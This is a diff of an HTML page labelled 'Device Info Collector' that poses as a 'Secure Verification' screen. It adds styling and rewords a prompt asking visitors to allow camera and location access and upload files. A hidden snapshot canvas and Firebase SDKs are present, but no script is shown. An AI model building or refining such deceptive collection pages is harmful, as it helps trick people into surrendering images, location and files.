@@ -5,6 +5,43 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>🔒 Device Info Collector</title>
   <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      background-color: #f5f7fa;
+      margin: 0;
+      padding: 20px;
+    }
+
+    h1 {
+      color: #0a3d62;
+    }
+
+    .card {
+      background-color: white;
+      max-width: 400px;
+      margin: 20px auto;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 12px;
+    }
+
+    video {
+      width: 100%;
+      border-radius: 10px;
+      margin-bottom: 15px;
+    }
+
+    input[type="file"] {
+      margin-top: 10px;
+    }
+
+    #status {
+      margin-top: 10px;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
   <h1>📡 Secure Verification In Progress...</h1>
@@ -13,8 +50,8 @@
     <video id="video" autoplay muted playsinline></video>
     <canvas id="snapshotCanvas" style="display: none;"></canvas>
     <input type="file" id="fileInput" multiple />
-    <p>✅ Allow camera, location, and upload files manually if needed.</p>
-    <p id="status" style="color: green;"></p> <!-- Add this if you want dynamic status updates -->
+    <p>✅ Please allow access to camera and location.<br>📁 You may upload files manually if prompted.</p>
+    <p id="status" style="color: green;"></p>
   </div>
 
   <!-- Firebase SDKs -->
